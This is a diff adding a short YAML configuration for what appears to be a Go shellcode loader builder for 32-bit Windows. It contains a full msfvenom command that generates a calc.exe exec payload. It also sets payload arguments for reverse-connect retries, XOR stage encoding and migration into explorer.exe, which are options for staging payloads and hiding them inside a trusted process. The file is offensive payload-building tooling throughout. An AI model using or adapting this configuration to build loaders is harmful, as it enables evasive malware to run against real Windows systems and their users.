@@ -1,0 +1,9 @@
+arch: 386
+outputdir: output # folder to store binaries
+shellcodedir: shellcode # folder to store shellcodes
+srcdir: src # sources of go files.
+platform: windows
+# default payload is shellcode i386 / spawn calc.exe
+# msfvenom -a x86 --platform Windows -p windows/exec cmd=calc.exe -b '\x00\xff'  -f hex -o payloads/calc.hex
+shellcodefile: calc.hex
+msfvenomargs: ReverseConnectRetries=255 EXITFUNC=thread EnableStageEncoding=true prependmigrate=true prependmigrateprocess=explorer.exe StageEncoder=x64/xor -b '\x00\xff'  -f hex
